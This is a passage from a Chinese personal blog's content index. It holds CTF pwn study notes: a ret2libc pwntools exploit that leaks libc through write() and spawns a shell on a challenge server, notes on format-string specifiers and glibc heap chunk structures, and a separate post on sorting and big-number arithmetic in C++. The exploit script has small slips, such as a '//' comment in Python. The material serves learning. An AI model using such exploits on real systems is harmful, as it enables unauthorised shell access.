-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/a7aa7555e20ab191.png" alt=""></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/13091ab9ec6a827c.png" alt=""></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="格式化字符串">格式化字符串</h3>
-<p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
-<p>%d:打印成数字，只能泄露栈本身内容</p>
-<p>%x:打印成16进制，只能泄露栈本身内容</p>
-<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
-<p>%c:输出字符</p>
-<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
-<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
-<p>%hn:写入两个字节，写入1–&gt;0001</p>
-<p>%hhn:写入单个字节,写入1–&gt;01</p>
-<h3 id="整数溢出">整数溢出</h3>
-<p>啥都没有，因为懒得搞，搞堆去了</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
-<h3 id="堆学习">堆学习</h3>
-<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
-<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>可以看出在一个chunk中有这样几个数据</p>
-<ul>
-<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
-<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
-<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
-<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
-</ul>
-<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
-<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<p>被释放的chunk被记录在链表中，具体结构如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<h4 id="bin是什么">bin是什么</h4>
-<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
-]]></content>
-      <categories>
-        <category>希踢爱抚!</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>入门</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基础算法01</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
-    <content><![CDATA[<p>这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
-<p>主要是：排序总结，高精度总结。</p>
-<span id="more"></span>
-<h3 id="排序模板">排序模板</h3>
-<h4 id="冒泡排序">冒泡排序</h4>
-<p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
-<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，…的排序，至此排序完成。</p>
-<p>核心代码如下:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
-<h4 id="快速排序">快速排序</h4>
-<p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
-<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
-<p>核心代码大同小异，这里我就摆一种：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>排序就先摆两个吧，有空了再贴(画饼</p>
-<h3 id="高精度计算">高精度计算</h3>
-<h4 id="a-b高精度">a+b高精度</h4>
-<p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
-<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
-<p><strong>实现代码：</strong></p>
-<p>读入数组部分：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>计算部分：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>全部代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
-<h4 id="a-b高精度，a-b高精度">a-b高精度，a*b高精度</h4>
-<p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
-<p>实现代码：</p>
-<p>减法：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>乘法：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span 